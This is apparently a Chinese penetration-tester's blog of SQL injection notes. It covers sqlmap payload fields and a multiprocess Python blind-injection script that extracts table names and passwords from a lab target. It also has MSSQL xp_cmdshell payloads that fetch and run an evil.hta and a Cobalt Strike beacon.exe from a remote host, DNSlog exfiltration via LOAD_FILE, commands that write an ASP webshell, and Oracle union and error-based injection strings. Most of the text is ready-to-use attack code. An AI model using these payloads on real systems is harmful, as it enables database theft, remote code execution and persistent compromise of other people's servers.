<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">title</span>&gt;</span>SAP MaxDB boolean-based blind - Stacked queries<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">stype</span>&gt;</span>1<span class="tag">&lt;/<span class="name">stype</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">level</span>&gt;</span>5<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">risk</span>&gt;</span>1<span class="tag">&lt;/<span class="name">risk</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">clause</span>&gt;</span>1-8<span class="tag">&lt;/<span class="name">clause</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">where</span>&gt;</span>1<span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">vector</span>&gt;</span>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">payload</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">payload</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comment</span>&gt;</span>--<span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comparison</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">comparison</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">details</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">dbms</span>&gt;</span>SAP MaxDB<span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>title<br>  title属性为当前测试Payload的标题，通过标题就可以了解当前的注入手法与测试的数据库类型。</p>
</li>
<li><p>stype<br>  查询类型。</p>
</li>
<li><p>level<br>  风险等级(1-5,默认1)。</p>
</li>
<li><p>risk<br>  危险等级(1-3,默认1)。</p>
</li>
<li><p>clause<br>  指定为每个payload使用的SQL查询从句。</p>
<p>  <img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown7Ftj9qHuXD1zeUV.png"></p>
</li>
<li><p>where<br>  与上图一致。</p>
</li>
<li><p>vector<br>  指定将使用的注入模版。</p>
</li>
<li><p>payload<br>  测试使用的payload ,[RANDNUM]，[DELIMITER_START]，[DELIMITER_STOP]分别代表着随机数值与字符。当SQLMap扫描时会把对应的随机数替换掉,然后再与boundary的前缀与后缀拼接起来,最终成为测试的Payload。</p>
</li>
<li><p>common<br>  payload 之后，boundary 拼接的后缀suffix之前。</p>
</li>
<li><p>char<br>  在union 查询中爆破列时所用的字符。</p>
</li>
<li><p>columns<br>  联合查询测试的列数范围。</p>
</li>
<li><p>response<br>  根据回显辨别这次注入的payload是否成功。</p>
</li>
<li><p>comparison<br>  使用字符串作为payload执行请求，将响应和负载响应进行对比，在基于布尔值的盲注中有效。</p>
</li>
<li><p>grep<br>  使用正则表达式去批结响应，判断时候注入成功，在基于错误的注入中有用。</p>
</li>
<li><p>time<br>  在基于time的注入中等待结果返回的所需要的时间</p>
</li>
<li><p>detail<br>  下设三个子节点</p>
</li>
</ul>
<p>最终的payload为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">where</span> <span class="operator">+</span> boundary.prefix<span class="operator">+</span>test.payload <span class="operator">+</span> test.common <span class="operator">+</span> <span class="operator">+</span>boundary.suffix</span><br></pre></td></tr></table></figure>

<h1 id="二分法-多进程脚本"><a href="#二分法-多进程脚本" class="headerlink" title="二分法 + 多进程脚本"></a><center>二分法 + 多进程脚本</center></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> rich.console <span class="keyword">import</span> Console</span><br><span class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> PrettyTable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    system(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CtrlC</span>(<span class="params">q2</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span> q2.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            name = q2.get()</span><br><span class="line">    table = PrettyTable(</span><br><span class="line">        [<span class="string">&#x27;The blasting data is&#x27;</span>])</span><br><span class="line">    table.align = <span class="string">&#x27;l&#x27;</span></span><br><span class="line">    row = [name]</span><br><span class="line">    table.add_row(row)</span><br><span class="line">    clear()</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">booler_injection</span>(<span class="params">url, q, q2, v</span>):</span><br><span class="line">    console = Console()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        i = q.get()</span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            py_dict = &#123;</span><br><span class="line">                <span class="string">&#x27;str1&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select database()),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;str2&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema = database()),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;str3&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name = 0x4E43683258684E62),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;str4&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select group_concat(password) from security.NCh2XhNb),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            payload_str = py_dict[<span class="string">&#x27;str2&#x27;</span>].<span class="built_in">format</span>(i, mid)</span><br><span class="line">            pld = url + payload_str</span><br><span class="line">            req1 = requests.get(pld)</span><br><span class="line">            <span class="built_in">print</span>(pld, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> req1.text.find(<span class="string">&#x27;You are in&#x27;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">            q2.put(v.value)</span><br><span class="line">            CtrlC(q2)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">44</span>:</span><br><span class="line">            v.value += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        v.value += <span class="built_in">chr</span>(mid)</span><br><span class="line">        v.value = v.value.replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        clear()</span><br><span class="line">        console.<span class="built_in">print</span>(<span class="string">&quot;[green][+]data is -&gt; [/green]&quot;</span> + v.value + <span class="string">&#x27;\n&#x27;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    v = Manager().Value(ctypes.c_char_p, <span class="string">&#x27;&#x27;</span>)  <span class="comment"># 创建临界</span></span><br><span class="line">    q2 = Queue()</span><br><span class="line">    q = Queue()</span><br><span class="line">    url = <span class="string">&quot;http://533b285a34d54db5a8e3acafda30c067.app.mituan.zone/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line">    progress1 = []</span><br><span class="line">    generate(q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        p1 = Process(target=booler_injection, args=(url, q, q2, v))</span><br><span class="line">        progress1.append(p1)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> progress1:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> progress1:</span><br><span class="line">        p.join()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过多次测试，存在一定缺陷：</p>
<p>  需要的数据长度低于10，进程数不能大于2，用1最好。</p>
<p>  需要的数据在10 - 20之间，进程数不能大于3，用2最好。</p>
<p>  需要的数据在20 - 30之间，进程数不能大于4，用3最好。</p>
<p>  以此类推。。。。。</p>
<p>  如若使用的进程数超出我提出的大小，会导致进程竞争进而出现乱序输出的情况。</p>
<p>但是单纯的多进程不会出现这个问题，初步判断是二分法大幅度的降低了对资源的调用，提高了写入临界区的频率，进而导致进程竞争，出现输出乱序，而我用的又是队列实现，需要对queue队列的锁原语<code>__init__</code> 才能解决（<del>一个猜测</del>），留个坑，以后填。</p>
<p>上面问题已解决：<font color="red"><strong>添加进程睡眠时间即可解决！！！</strong></font></p>
<h1 id="基于LOAD-FILE函数的无回显SQL注入"><a href="#基于LOAD-FILE函数的无回显SQL注入" class="headerlink" title="基于LOAD_FILE函数的无回显SQL注入"></a><center>基于LOAD_FILE函数的无回显SQL注入</center></h1><p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。先</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查看load_file()可以读取的磁盘。</p>
<ul>
<li>当<code>secure_file_priv</code>为空，就可以读取磁盘的目录。</li>
<li>当<code>secure_file_priv</code>为G:\，就可以读取G盘的文件。</li>
<li>当<code>secure_file_priv</code>为null，load_file就不能加载文件。</li>
</ul>
<h2 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h2><p>但是当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据。</p>
<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器。<br>UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</p>
<p>这也就解释了为什么concat()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。</p>
<p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据</p>
<p>由此Paylaod就为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(查询语句),<span class="string">&#x27;.t6n089.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h1 id="基于命令执行函数的无回显SQL注入"><a href="#基于命令执行函数的无回显SQL注入" class="headerlink" title="基于命令执行函数的无回显SQL注入"></a><center>基于命令执行函数的无回显SQL注入</center></h1><p>一个MsSql<code>高权限</code>注入点，可通过<code>xp_cmdshell</code>执行命令，但是没有回显信息。</p>
<p>因为没有回显，所以分2种方式利用。</p>
<h2 id="远程执行方式上线"><a href="#远程执行方式上线" class="headerlink" title="远程执行方式上线"></a>远程执行方式上线</h2><p>payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">;exec master..xp_cmdshell <span class="string">&quot;cmd /c ping ******.dnslog.cn&quot;</span></span><br><span class="line">;exec master..xp_cmdshell <span class="string">&quot;cmd /c mshta http://192.168.1.105:8080/evil.hta&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="文件落地方式上线"><a href="#文件落地方式上线" class="headerlink" title="文件落地方式上线"></a>文件落地方式上线</h2><p>我们还可以使用以下这些文件落地方式来上线CS&#x2F;MSF，但前提是得提前准备好一个免杀的CS木马供远程下载和执行，否则也会被查杀和拦截。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Mshta/Certutil/Bitsadmin/Powershell/MpCmdRun</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell &quot;cmd /c certutil -urlcache -split -f http://192.168.1.105:8080/beacon.exe C:\ProgramData\beacon.exe&quot;</span><br><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell &quot;cmd /c C:\ProgramData\beacon.exe&quot;</span><br></pre></td></tr></table></figure>

<p>同时此方式还可以实现外带绝对路径出来：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;cmd /c for /r C:\ProgramData\ %i in (beacon.exe*) do certutil -urlcache -split -f http://******.ceye.io/%i&#x27;</span></span><br></pre></td></tr></table></figure>

<p>以上除了用<code>xp_cmdshell</code>函数还可以用<code>sp_oacreate</code>替代。</p>
<h2 id="获取绝对路径Getshell"><a href="#获取绝对路径Getshell" class="headerlink" title="获取绝对路径Getshell"></a>获取绝对路径Getshell</h2><p>我们在实战中有时也会遇到无回显、不出网的场景，这时可以先去尝试通过404或文件报错页来获取网站的绝对路径，如果不行再去执行以下命令将找到的路径写入Web目录下，然后再去写入Webshell。</p>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;for /r C:\ %i in (1653042293000.png*) do echo %i&gt; %i\..\path.txt&#x27;</span></span><br><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;echo ^&lt;%execute request(&quot;1&quot;)%^&gt; &gt;C:\inetpub\wwwroot\upload\shell.asp&#x27;</span></span><br></pre></td></tr></table></figure>

<p>或者可以通过执行以下命令在查找绝对路径的同时写入Webshell，在指定的C盘中循环查找某某文件，将找到的绝对路径保存在%i变量中，..&#x2F;是返回上级目录，如果有找到那个文件就往里边写入一个shell.asp。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>r C:\ <span class="operator">%</span>i <span class="keyword">in</span> (<span class="number">1653042293000.</span>png<span class="operator">*</span>) do echo <span class="operator">^</span><span class="operator">&lt;</span><span class="operator">%</span><span class="keyword">execute</span> request(&quot;1&quot;)<span class="operator">%</span><span class="operator">^</span><span class="operator">&gt;</span> <span class="operator">&gt;</span> <span class="operator">%</span>i<span class="operator">/</span>..<span class="operator">/</span>shell.asp</span><br></pre></td></tr></table></figure>

<h1 id="笛卡尔积注入"><a href="#笛卡尔积注入" class="headerlink" title="笛卡尔积注入"></a><center>笛卡尔积注入</center></h1><p>遇到不能使用括号，或者shell()函数不能使用的情况下。</p>
<p>具体数学实现就不说了，大概就是如下图：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_5ERbl7aIV2.png"></p>
<p>也就是说数字1先去乘以ABC，然后数字2再去乘以ABC，然后数字3再去乘以ABC，是不是感觉很熟悉，其实就是Burp suite里面的Intruder模块的Attack type里面的Clutser bomb攻击方式。</p>
<p>这样逐渐的去相乘，然后就会有个时间。所以又叫大负荷查询，大负荷注入。</p>
<p>Payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns</span><br></pre></td></tr></table></figure>



<ul>
<li><p>当where 1&#x3D;1时存在延时，where 1&#x3D;2时不延时，就说明存在时间盲注。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,b.column_name <span class="keyword">from</span> information_schema.tables a <span class="keyword">join</span> information_schema.columns b <span class="keyword">join</span> information_schema.columns c <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>列 ： 判断5kcrm_user表名下name列前两位是否为’ad’开头的内容，如果存在则延时</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="number">5</span>kcrm_action_log <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,b.column_name <span class="keyword">from</span> information_schema.columns b <span class="keyword">where</span> b.column_name regexp <span class="type">binary</span> <span class="string">&#x27;^ad&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>不延时，说明数据库中无adddxxx开头的列名。然后通过循环遍历所有字符，获取到数据库中所有列名，同样的方法可以获取表名</p>
<p>其他以此类推</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQLInject</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle注入</title>
    <url>/-SQLInject/Oracle/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打JAVA站一般数据库都是Oracle，有一些特点的原因，所以特别记录一下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownWynZ1puLEAxdOHl.png"></p>
<span id="more"></span>

<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span><span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;def&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>table_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.tables<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>column_name,<span class="operator">+</span><span class="keyword">NULL</span><span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>information_schema.columns<span class="operator">+</span><span class="keyword">WHERE</span><span class="operator">+</span>table_name<span class="operator">=</span><span class="string">&#x27;users_abcdef&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>


<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="keyword">UNION</span><span class="operator">+</span><span class="keyword">SELECT</span><span class="operator">+</span>username_gugofj,<span class="operator">+</span>password_wvqepc<span class="operator">+</span><span class="keyword">FROM</span><span class="operator">+</span>users_lsnuvu<span class="comment">--</span></span><br></pre></td></tr></table></figure>


<ul>
<li>数据库</li>
<li>表<br>  USERS_TPHDTZ</li>
<li>列<br>  PASSWORD_AGKTIJ<br>  USERNAME_UTZPGF</li>
<li>字段</li>
</ul>
<h1 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Mysql是中小型数据库，而Oracle是<strong>大型数据库</strong>。</p>
<p>在注入时Oracle数据库与MySQL数据库是有区别的。</p>
<h2 id="2、oracle数据库权限分为2类"><a href="#2、oracle数据库权限分为2类" class="headerlink" title="2、oracle数据库权限分为2类"></a>2、oracle数据库权限分为2类</h2><p>注释符：<code>--</code></p>
<p><strong>dba</strong>拥有全部权限，数据库<code>最高权限</code>，只有dba才可以创建数据库结构</p>
<p><strong>oracle数据库自带的dual表，只有一行一列，每个用户都可以使用</strong></p>
<p>dual表可能被删掉，sys可以恢复</p>
<h3 id="2-1-、dual表"><a href="#2-1-、dual表" class="headerlink" title="2.1 、dual表"></a>2.1 、dual表</h3><p>dual是一个<code>虚拟表</code>，用来构成select的语法规则，<strong>oracle保证dual里面永远只有一条记录</strong>。我们可以用它来做很多事情。</p>
<h2 id="3、判断是否为oracle数据库"><a href="#3、判断是否为oracle数据库" class="headerlink" title="3、判断是否为oracle数据库"></a>3、判断是否为oracle数据库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> dual)</span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> user_tables)<span class="operator">&gt;</span><span class="number">0</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h2 id="4、dual表实现联合注入"><a href="#4、dual表实现联合注入" class="headerlink" title="4、dual表实现联合注入"></a>4、dual表实现联合注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n <span class="comment">--</span></span><br></pre></td></tr></table></figure>


<p><strong>强类型</strong>，字符类型需要对上，这里可以<strong>使用null代替无法猜测的数据类型</strong>位置如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual </span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h3 id="4-1、查库"><a href="#4-1、查库" class="headerlink" title="4.1、查库"></a>4.1、查库</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">-- </span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个数据库&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;第一个数据库&#x27;</span> <span class="keyword">and</span> owner<span class="operator">&lt;&gt;</span>``<span class="string">&#x27;第二个数据库&#x27;</span>``),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="operator">-</span></span><br></pre></td></tr></table></figure>




<h3 id="4-2、查表"><a href="#4-2、查表" class="headerlink" title="4.2、查表"></a>4.2、查表</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个表名&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<h3 id="4-3、字段"><a href="#4-3、字段" class="headerlink" title="4.3、字段"></a>4.3、字段</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>``,(``<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span>``<span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),``<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>




<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;DEMO&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> column_name <span class="operator">&lt;&gt;</span><span class="string">&#x27;第一个字段&#x27;</span>),<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li>读取数据：字段名需要用<strong>双引号括起来！！</strong>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;字段名&quot;<span class="operator">||</span><span class="operator">-</span><span class="operator">||</span>&quot;字段名&quot;, <span class="keyword">from</span> 表名 <span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5、dual表实现报错注入"><a href="#5、dual表实现报错注入" class="headerlink" title="5、dual表实现报错注入"></a>5、dual表实现报错注入</h2><p>dbms_xdb_version.checkin()函数：获取当前用户名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.checkin((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>




<p>dbms_xdb_versionuncheckout()函数</p>
